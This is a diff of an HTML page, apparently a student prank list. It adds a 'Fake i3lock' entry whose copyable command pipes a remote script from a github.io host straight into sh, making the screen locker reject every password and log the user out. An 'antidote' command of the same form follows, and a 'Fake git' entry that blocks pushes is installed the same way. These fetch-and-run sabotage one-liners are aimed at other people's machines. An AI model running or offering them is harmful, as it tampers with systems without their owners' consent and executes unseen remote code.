@@ -28,6 +28,13 @@
         <div id="main">
             <div id="confloose-list">
                 <div class="block annotation needs-testing">
+                    <h3>Fake i3lock</h3>
+                    <p>i3lock est kc (le mot de passe est toujours faux) (mais on est logout quand même)</p>
+                    <input type="text" onclick="clip(this)" value="curl https://d-002.github.io/epita/confloose/fake-i3lock/confloose.sh | sh">
+                    <p>Antidote : aller dans un tty, taper <code>pkill i3lock</code>, logout, retourner dans i3, puis :</p>
+                    <input type="text" onclick="clip(this)" value="curl https://d-002.github.io/epita/confloose/fake-i3lock/antidote.sh | sh">
+                </div>
+                <div class="block annotation needs-testing">
                     <h3>Fake git</h3>
                     <p>Git est kc (il peut pas push)</p>
                     <input type="text" onclick="clip(this)" value="curl https://d-002.github.io/epita/confloose/fake-git/confloose.sh | sh">
